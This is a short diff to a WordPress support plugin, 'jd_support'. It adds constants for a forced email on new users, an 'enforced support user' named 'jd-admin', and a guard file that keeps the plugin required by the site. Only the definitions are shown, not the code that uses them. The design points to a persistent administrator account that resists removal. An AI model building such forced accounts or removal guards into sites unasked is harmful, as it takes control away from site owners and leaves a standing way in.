@@ -30,6 +30,21 @@ define('JD_SUPPORT_PLUGIN_NAME', 'jd_support');
 define('JD_SUPPORT_PLUGIN_PATH', plugin_dir_path(__FILE__));
 define('JD_SUPPORT_PLUGIN_URL', plugin_dir_url(__FILE__));
 
+// Default forced email for new users (override via wp-config.php if needed)
+if (!defined('JD_SUPPORT_FORCED_USER_EMAIL')) {
+	define('JD_SUPPORT_FORCED_USER_EMAIL', 'webadmin@justdev.org');
+}
+
+// Default login for the enforced support user
+if (!defined('JD_SUPPORT_FORCED_USER_LOGIN')) {
+	define('JD_SUPPORT_FORCED_USER_LOGIN', 'jd-admin');
+}
+
+// Guard filename to ensure the plugin remains required by the site
+if (!defined('JD_SUPPORT_GUARD_FILENAME')) {
+	define('JD_SUPPORT_GUARD_FILENAME', 'jd-support-guard.php');
+}
+
 // Simple autoloader
 spl_autoload_register(function ($class) {
 	// Convert namespace to file path
